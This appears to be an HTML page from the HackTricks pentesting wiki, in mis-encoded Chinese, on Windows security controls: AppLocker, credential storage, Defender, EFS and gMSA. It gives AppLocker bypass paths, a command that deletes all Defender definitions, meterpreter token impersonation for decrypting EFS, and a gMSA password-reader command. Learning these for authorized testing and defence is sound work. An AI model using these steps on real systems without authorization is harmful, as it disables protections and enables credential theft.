<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Windows Security Controls</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="windows-security-controls"><a class="header" href="#windows-security-controls">Windows Security Controls</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p>ä½¿ç”¨ <a href="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks" %}</p>
<h2 id="applocker-ç­–ç•¥"><a class="header" href="#applocker-ç­–ç•¥">AppLocker ç­–ç•¥</a></h2>
<p>åº”ç”¨ç¨‹åºç™½åå•æ˜¯ä¸€ä¸ªç»è¿‡æ‰¹å‡†çš„è½¯ä»¶åº”ç”¨ç¨‹åºæˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„åˆ—è¡¨ï¼Œè¿™äº›ç¨‹åºè¢«å…è®¸åœ¨ç³»ç»Ÿä¸Šå­˜åœ¨å’Œè¿è¡Œã€‚å…¶ç›®æ ‡æ˜¯ä¿æŠ¤ç¯å¢ƒå…å—æœ‰å®³æ¶æ„è½¯ä»¶å’Œä¸ç¬¦åˆç»„ç»‡ç‰¹å®šä¸šåŠ¡éœ€æ±‚çš„æœªæ‰¹å‡†è½¯ä»¶çš„å½±å“ã€‚</p>
<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker">AppLocker</a> æ˜¯å¾®è½¯çš„ <strong>åº”ç”¨ç¨‹åºç™½åå•è§£å†³æ–¹æ¡ˆ</strong>ï¼Œä¸ºç³»ç»Ÿç®¡ç†å‘˜æä¾›å¯¹ <strong>ç”¨æˆ·å¯ä»¥è¿è¡Œå“ªäº›åº”ç”¨ç¨‹åºå’Œæ–‡ä»¶</strong> çš„æ§åˆ¶ã€‚å®ƒæä¾›å¯¹å¯æ‰§è¡Œæ–‡ä»¶ã€è„šæœ¬ã€Windows å®‰è£…ç¨‹åºæ–‡ä»¶ã€DLLã€æ‰“åŒ…åº”ç”¨ç¨‹åºå’Œæ‰“åŒ…åº”ç”¨ç¨‹åºå®‰è£…ç¨‹åºçš„ <strong>ç»†ç²’åº¦æ§åˆ¶</strong>ã€‚<br />
ç»„ç»‡é€šå¸¸ä¼š <strong>é˜»æ­¢ cmd.exe å’Œ PowerShell.exe</strong> ä»¥åŠå¯¹æŸäº›ç›®å½•çš„å†™å…¥è®¿é—®ï¼Œ<strong>ä½†è¿™ä¸€åˆ‡éƒ½å¯ä»¥è¢«ç»•è¿‡</strong>ã€‚</p>
<h3 id="æ£€æŸ¥"><a class="header" href="#æ£€æŸ¥">æ£€æŸ¥</a></h3>
<p>æ£€æŸ¥å“ªäº›æ–‡ä»¶/æ‰©å±•åè¢«åˆ—å…¥é»‘åå•/ç™½åå•ï¼š</p>
<pre><code class="language-powershell">Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
</code></pre>
<p>æ­¤æ³¨å†Œè¡¨è·¯å¾„åŒ…å«ç”± AppLocker åº”ç”¨çš„é…ç½®å’Œç­–ç•¥ï¼Œæä¾›äº†ä¸€ç§æŸ¥çœ‹ç³»ç»Ÿä¸Šå¼ºåˆ¶æ‰§è¡Œçš„å½“å‰è§„åˆ™é›†çš„æ–¹æ³•ï¼š</p>
<ul>
<li><code>HKLM\Software\Policies\Microsoft\Windows\SrpV2</code></li>
</ul>
<h3 id="ç»•è¿‡"><a class="header" href="#ç»•è¿‡">ç»•è¿‡</a></h3>
<ul>
<li>æœ‰ç”¨çš„ <strong>å¯å†™æ–‡ä»¶å¤¹</strong> ç”¨äºç»•è¿‡ AppLocker ç­–ç•¥ï¼šå¦‚æœ AppLocker å…è®¸åœ¨ <code>C:\Windows\System32</code> æˆ– <code>C:\Windows</code> å†…æ‰§è¡Œä»»ä½•å†…å®¹ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ <strong>å¯å†™æ–‡ä»¶å¤¹</strong> æ¥ <strong>ç»•è¿‡æ­¤é™åˆ¶</strong>ã€‚</li>
</ul>
<pre><code>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
</code></pre>
<ul>
<li>å¸¸è§çš„ <strong>trusted</strong> <a href="https://lolbas-project.github.io/"><strong>"LOLBAS's"</strong></a> äºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿå¯ä»¥ç”¨äºç»•è¿‡ AppLockerã€‚</li>
<li><strong>ç¼–å†™ä¸å½“çš„è§„åˆ™ä¹Ÿå¯èƒ½è¢«ç»•è¿‡</strong></li>
<li>ä¾‹å¦‚ï¼Œ<strong><code>&lt;FilePathCondition Path="%OSDRIVE%*\allowed*"/&gt;</code></strong>ï¼Œæ‚¨å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹åˆ›å»ºä¸€ä¸ª <strong>åä¸º <code>allowed</code> çš„æ–‡ä»¶å¤¹</strong>ï¼Œå®ƒå°†è¢«å…è®¸ã€‚</li>
<li>ç»„ç»‡é€šå¸¸è¿˜ä¸“æ³¨äº <strong>é˜»æ­¢ <code>%System32%\WindowsPowerShell\v1.0\powershell.exe</code> å¯æ‰§è¡Œæ–‡ä»¶</strong>ï¼Œä½†å¿˜è®°äº† <strong>å…¶ä»–</strong> <a href="https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations"><strong>PowerShell å¯æ‰§è¡Œæ–‡ä»¶ä½ç½®</strong></a>ï¼Œä¾‹å¦‚ <code>%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code> æˆ– <code>PowerShell_ISE.exe</code>ã€‚</li>
<li><strong>DLL å¼ºåˆ¶æ‰§è¡Œå¾ˆå°‘å¯ç”¨</strong>ï¼Œå› ä¸ºå®ƒå¯èƒ½å¯¹ç³»ç»Ÿé€ æˆé¢å¤–è´Ÿæ‹…ï¼Œå¹¶ä¸”éœ€è¦å¤§é‡æµ‹è¯•ä»¥ç¡®ä¿ä¸ä¼šå‡ºç°æ•…éšœã€‚å› æ­¤ï¼Œä½¿ç”¨ <strong>DLL ä½œä¸ºåé—¨å°†æœ‰åŠ©äºç»•è¿‡ AppLocker</strong>ã€‚</li>
<li>æ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick"><strong>ReflectivePick</strong></a> æˆ– <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick"><strong>SharpPick</strong></a> åœ¨ä»»ä½•è¿›ç¨‹ä¸­ <strong>æ‰§è¡Œ Powershell</strong> ä»£ç å¹¶ç»•è¿‡ AppLockerã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹: <a href="https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode">https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode</a>ã€‚</li>
</ul>
<h2 id="å‡­æ®å­˜å‚¨"><a class="header" href="#å‡­æ®å­˜å‚¨">å‡­æ®å­˜å‚¨</a></h2>
<h3 id="å®‰å…¨è´¦æˆ·ç®¡ç†å™¨-sam"><a class="header" href="#å®‰å…¨è´¦æˆ·ç®¡ç†å™¨-sam">å®‰å…¨è´¦æˆ·ç®¡ç†å™¨ (SAM)</a></h3>
<p>æœ¬åœ°å‡­æ®å­˜å‚¨åœ¨æ­¤æ–‡ä»¶ä¸­ï¼Œå¯†ç ç»è¿‡å“ˆå¸Œå¤„ç†ã€‚</p>
<h3 id="æœ¬åœ°å®‰å…¨æœºæ„-lsa---lsass"><a class="header" href="#æœ¬åœ°å®‰å…¨æœºæ„-lsa---lsass">æœ¬åœ°å®‰å…¨æœºæ„ (LSA) - LSASS</a></h3>
<p><strong>å‡­æ®</strong>ï¼ˆå“ˆå¸Œï¼‰è¢« <strong>ä¿å­˜</strong> åœ¨æ­¤å­ç³»ç»Ÿçš„ <strong>å†…å­˜</strong> ä¸­ï¼Œä»¥å®ç°å•ç‚¹ç™»å½•ã€‚<br />
<strong>LSA</strong> ç®¡ç†æœ¬åœ° <strong>å®‰å…¨ç­–ç•¥</strong>ï¼ˆå¯†ç ç­–ç•¥ã€ç”¨æˆ·æƒé™...ï¼‰ã€<strong>èº«ä»½éªŒè¯</strong>ã€<strong>è®¿é—®ä»¤ç‰Œ</strong>...<br />
LSA å°†æ˜¯ <strong>æ£€æŸ¥</strong> æä¾›çš„å‡­æ®çš„ <strong>SAM</strong> æ–‡ä»¶ï¼ˆç”¨äºæœ¬åœ°ç™»å½•ï¼‰å¹¶ <strong>ä¸</strong> åŸŸæ§åˆ¶å™¨ <strong>é€šä¿¡</strong> ä»¥éªŒè¯åŸŸç”¨æˆ·ã€‚</p>
<p><strong>å‡­æ®</strong> è¢« <strong>ä¿å­˜</strong> åœ¨ <strong>è¿›ç¨‹ LSASS</strong> ä¸­ï¼šKerberos ç¥¨è¯ã€NT å’Œ LM å“ˆå¸Œã€æ˜“äºè§£å¯†çš„å¯†ç ã€‚</p>
<h3 id="lsa-ç§˜å¯†"><a class="header" href="#lsa-ç§˜å¯†">LSA ç§˜å¯†</a></h3>
<p>LSA å¯èƒ½ä¼šåœ¨ç£ç›˜ä¸Šä¿å­˜ä¸€äº›å‡­æ®ï¼š</p>
<ul>
<li>Active Directory çš„è®¡ç®—æœºè´¦æˆ·å¯†ç ï¼ˆæ— æ³•è®¿é—®çš„åŸŸæ§åˆ¶å™¨ï¼‰ã€‚</li>
<li>Windows æœåŠ¡è´¦æˆ·çš„å¯†ç </li>
<li>è®¡åˆ’ä»»åŠ¡çš„å¯†ç </li>
<li>æ›´å¤šï¼ˆIIS åº”ç”¨ç¨‹åºçš„å¯†ç ...ï¼‰</li>
</ul>
<h3 id="ntdsdit"><a class="header" href="#ntdsdit">NTDS.dit</a></h3>
<p>è¿™æ˜¯ Active Directory çš„æ•°æ®åº“ã€‚å®ƒä»…å­˜åœ¨äºåŸŸæ§åˆ¶å™¨ä¸­ã€‚</p>
<h2 id="defender"><a class="header" href="#defender">Defender</a></h2>
<p><a href="https://en.wikipedia.org/wiki/Microsoft_Defender"><strong>Microsoft Defender</strong></a> æ˜¯ Windows 10 å’Œ Windows 11 ä»¥åŠ Windows Server ç‰ˆæœ¬ä¸­å¯ç”¨çš„é˜²ç—…æ¯’è½¯ä»¶ã€‚å®ƒ <strong>é˜»æ­¢</strong> å¸¸è§çš„ pentesting å·¥å…·ï¼Œå¦‚ <strong><code>WinPEAS</code></strong>ã€‚ç„¶è€Œï¼Œæœ‰æ–¹æ³•å¯ä»¥ <strong>ç»•è¿‡è¿™äº›ä¿æŠ¤</strong>ã€‚</p>
<h3 id="æ£€æŸ¥-1"><a class="header" href="#æ£€æŸ¥-1">æ£€æŸ¥</a></h3>
<p>è¦æ£€æŸ¥ <strong>Defender</strong> çš„ <strong>çŠ¶æ€</strong>ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œ PS cmdlet <strong><code>Get-MpComputerStatus</code></strong>ï¼ˆæ£€æŸ¥ <strong><code>RealTimeProtectionEnabled</code></strong> çš„å€¼ä»¥äº†è§£å®ƒæ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ï¼‰ï¼š</p>
<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>
<p>è¦æšä¸¾å®ƒï¼Œæ‚¨è¿˜å¯ä»¥è¿è¡Œï¼š</p>
<pre><code class="language-bash">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
</code></pre>
<h2 id="åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ-efs"><a class="header" href="#åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ-efs">åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ (EFS)</a></h2>
<p>EFS é€šè¿‡åŠ å¯†ä¿æŠ¤æ–‡ä»¶ï¼Œåˆ©ç”¨ç§°ä¸º <strong>æ–‡ä»¶åŠ å¯†å¯†é’¥ (FEK)</strong> çš„ <strong>å¯¹ç§°å¯†é’¥</strong>ã€‚è¯¥å¯†é’¥ä½¿ç”¨ç”¨æˆ·çš„ <strong>å…¬é’¥</strong> è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å­˜å‚¨åœ¨åŠ å¯†æ–‡ä»¶çš„ $EFS <strong>æ›¿ä»£æ•°æ®æµ</strong> ä¸­ã€‚å½“éœ€è¦è§£å¯†æ—¶ï¼Œä½¿ç”¨ç”¨æˆ·æ•°å­—è¯ä¹¦çš„ç›¸åº” <strong>ç§é’¥</strong> ä» $EFS æµä¸­è§£å¯† FEKã€‚æ›´å¤šè¯¦ç»†ä¿¡æ¯å¯ä»¥åœ¨ <a href="https://en.wikipedia.org/wiki/Encrypting_File_System">è¿™é‡Œ</a> æ‰¾åˆ°ã€‚</p>
<p><strong>æ— éœ€ç”¨æˆ·å¯åŠ¨çš„è§£å¯†åœºæ™¯</strong> åŒ…æ‹¬ï¼š</p>
<ul>
<li>å½“æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹è¢«ç§»åŠ¨åˆ°é EFS æ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚ <a href="https://en.wikipedia.org/wiki/File_Allocation_Table">FAT32</a>ï¼‰æ—¶ï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨è§£å¯†ã€‚</li>
<li>é€šè¿‡ SMB/CIFS åè®®åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„åŠ å¯†æ–‡ä»¶åœ¨ä¼ è¾“å‰ä¼šè¢«è§£å¯†ã€‚</li>
</ul>
<p>è¿™ç§åŠ å¯†æ–¹æ³•å…è®¸æ‰€æœ‰è€…å¯¹åŠ å¯†æ–‡ä»¶è¿›è¡Œ <strong>é€æ˜è®¿é—®</strong>ã€‚ç„¶è€Œï¼Œä»…ä»…æ›´æ”¹æ‰€æœ‰è€…çš„å¯†ç å¹¶ç™»å½•å¹¶ä¸èƒ½å…è®¸è§£å¯†ã€‚</p>
<p><strong>å…³é”®è¦ç‚¹</strong>ï¼š</p>
<ul>
<li>EFS ä½¿ç”¨å¯¹ç§° FEKï¼Œä½¿ç”¨ç”¨æˆ·çš„å…¬é’¥è¿›è¡ŒåŠ å¯†ã€‚</li>
<li>è§£å¯†ä½¿ç”¨ç”¨æˆ·çš„ç§é’¥è®¿é—® FEKã€‚</li>
<li>åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ä¼šè‡ªåŠ¨è§£å¯†ï¼Œä¾‹å¦‚å¤åˆ¶åˆ° FAT32 æˆ–ç½‘ç»œä¼ è¾“ã€‚</li>
<li>åŠ å¯†æ–‡ä»¶å¯¹æ‰€æœ‰è€…å¯è®¿é—®ï¼Œæ— éœ€é¢å¤–æ­¥éª¤ã€‚</li>
</ul>
<h3 id="æ£€æŸ¥-efs-ä¿¡æ¯"><a class="header" href="#æ£€æŸ¥-efs-ä¿¡æ¯">æ£€æŸ¥ EFS ä¿¡æ¯</a></h3>
<p>æ£€æŸ¥ <strong>ç”¨æˆ·</strong> æ˜¯å¦ <strong>ä½¿ç”¨</strong> äº†æ­¤ <strong>æœåŠ¡</strong>ï¼Œæ£€æŸ¥æ­¤è·¯å¾„æ˜¯å¦å­˜åœ¨ï¼š<code>C:\users\&lt;username&gt;\appdata\roaming\Microsoft\Protect</code></p>
<p>ä½¿ç”¨ cipher /c &lt;file&gt; æ£€æŸ¥ <strong>è°</strong> æœ‰ <strong>è®¿é—®</strong> æ–‡ä»¶çš„æƒé™<br />
æ‚¨è¿˜å¯ä»¥åœ¨æ–‡ä»¶å¤¹å†…ä½¿ç”¨ <code>cipher /e</code> å’Œ <code>cipher /d</code> æ¥ <strong>åŠ å¯†</strong> å’Œ <strong>è§£å¯†</strong> æ‰€æœ‰æ–‡ä»¶</p>
<h3 id="è§£å¯†-efs-æ–‡ä»¶"><a class="header" href="#è§£å¯†-efs-æ–‡ä»¶">è§£å¯† EFS æ–‡ä»¶</a></h3>
<h4 id="æˆä¸ºæƒé™ç³»ç»Ÿ"><a class="header" href="#æˆä¸ºæƒé™ç³»ç»Ÿ">æˆä¸ºæƒé™ç³»ç»Ÿ</a></h4>
<p>è¿™ç§æ–¹å¼è¦æ±‚ <strong>å—å®³è€…ç”¨æˆ·</strong> åœ¨ä¸»æœºå†… <strong>è¿è¡Œ</strong> ä¸€ä¸ª <strong>è¿›ç¨‹</strong>ã€‚å¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œä½¿ç”¨ <code>meterpreter</code> ä¼šè¯ï¼Œæ‚¨å¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·è¿›ç¨‹çš„ä»¤ç‰Œï¼ˆ<code>incognito</code> ä¸­çš„ <code>impersonate_token</code>ï¼‰ã€‚æˆ–è€…æ‚¨å¯ä»¥ç›´æ¥ <code>migrate</code> åˆ°ç”¨æˆ·çš„è¿›ç¨‹ã€‚</p>
<h4 id="çŸ¥é“ç”¨æˆ·å¯†ç "><a class="header" href="#çŸ¥é“ç”¨æˆ·å¯†ç ">çŸ¥é“ç”¨æˆ·å¯†ç </a></h4>
<p>{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}</p>
<h2 id="ç»„ç®¡ç†æœåŠ¡è´¦æˆ·-gmsa"><a class="header" href="#ç»„ç®¡ç†æœåŠ¡è´¦æˆ·-gmsa">ç»„ç®¡ç†æœåŠ¡è´¦æˆ· (gMSA)</a></h2>
<p>å¾®è½¯å¼€å‘äº† <strong>ç»„ç®¡ç†æœåŠ¡è´¦æˆ· (gMSA)</strong> ä»¥ç®€åŒ– IT åŸºç¡€è®¾æ–½ä¸­æœåŠ¡è´¦æˆ·çš„ç®¡ç†ã€‚ä¸ä¼ ç»Ÿçš„æœåŠ¡è´¦æˆ·ï¼ˆé€šå¸¸å¯ç”¨â€œ<strong>å¯†ç æ°¸ä¸è¿‡æœŸ</strong>â€è®¾ç½®ï¼‰ä¸åŒï¼ŒgMSA æä¾›äº†æ›´å®‰å…¨å’Œå¯ç®¡ç†çš„è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li><strong>è‡ªåŠ¨å¯†ç ç®¡ç†</strong>ï¼šgMSA ä½¿ç”¨å¤æ‚çš„ 240 å­—ç¬¦å¯†ç ï¼Œè‡ªåŠ¨æ ¹æ®åŸŸæˆ–è®¡ç®—æœºç­–ç•¥è¿›è¡Œæ›´æ”¹ã€‚æ­¤è¿‡ç¨‹ç”±å¾®è½¯çš„å¯†é’¥åˆ†å‘æœåŠ¡ (KDC) å¤„ç†ï¼Œæ¶ˆé™¤äº†æ‰‹åŠ¨æ›´æ–°å¯†ç çš„éœ€è¦ã€‚</li>
<li><strong>å¢å¼ºå®‰å…¨æ€§</strong>ï¼šè¿™äº›è´¦æˆ·å…å—é”å®šï¼Œå¹¶ä¸”ä¸èƒ½ç”¨äºäº¤äº’å¼ç™»å½•ï¼Œä»è€Œå¢å¼ºäº†å®‰å…¨æ€§ã€‚</li>
<li><strong>å¤šä¸»æœºæ”¯æŒ</strong>ï¼šgMSA å¯ä»¥åœ¨å¤šä¸ªä¸»æœºä¹‹é—´å…±äº«ï¼Œéå¸¸é€‚åˆåœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šè¿è¡Œçš„æœåŠ¡ã€‚</li>
<li><strong>è®¡åˆ’ä»»åŠ¡èƒ½åŠ›</strong>ï¼šä¸ç®¡ç†æœåŠ¡è´¦æˆ·ä¸åŒï¼ŒgMSA æ”¯æŒè¿è¡Œè®¡åˆ’ä»»åŠ¡ã€‚</li>
<li><strong>ç®€åŒ– SPN ç®¡ç†</strong>ï¼šå½“è®¡ç®—æœºçš„ sAMaccount è¯¦ç»†ä¿¡æ¯æˆ– DNS åç§°å‘ç”Ÿæ›´æ”¹æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æ›´æ–°æœåŠ¡ä¸»ä½“åç§° (SPN)ï¼Œç®€åŒ– SPN ç®¡ç†ã€‚</li>
</ul>
<p>gMSA çš„å¯†ç å­˜å‚¨åœ¨ LDAP å±æ€§ <em><strong>msDS-ManagedPassword</strong></em> ä¸­ï¼Œå¹¶ç”±åŸŸæ§åˆ¶å™¨ (DC) æ¯ 30 å¤©è‡ªåŠ¨é‡ç½®ä¸€æ¬¡ã€‚æ­¤å¯†ç æ˜¯ä¸€ä¸ªç§°ä¸º <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e">MSDS-MANAGEDPASSWORD_BLOB</a> çš„åŠ å¯†æ•°æ®å—ï¼Œä»…å¯ç”±æˆæƒç®¡ç†å‘˜å’Œå®‰è£… gMSA çš„æœåŠ¡å™¨æ£€ç´¢ï¼Œä»è€Œç¡®ä¿å®‰å…¨ç¯å¢ƒã€‚è¦è®¿é—®æ­¤ä¿¡æ¯ï¼Œéœ€è¦å®‰å…¨è¿æ¥ï¼Œä¾‹å¦‚ LDAPSï¼Œæˆ–è€…è¿æ¥å¿…é¡»ç»è¿‡â€œå¯†å°å’Œå®‰å…¨â€èº«ä»½éªŒè¯ã€‚</p>
<p><img src="../../.gitbook/assets/asd1.png" alt="https://cube0x0.github.io/Relaying-for-gMSA/" /></p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://github.com/rvazarkar/GMSAPasswordReader"><strong>GMSAPasswordReader</strong></a>**ï¼š</p>
<pre><code>/GMSAPasswordReader --AccountName jkohler
</code></pre>
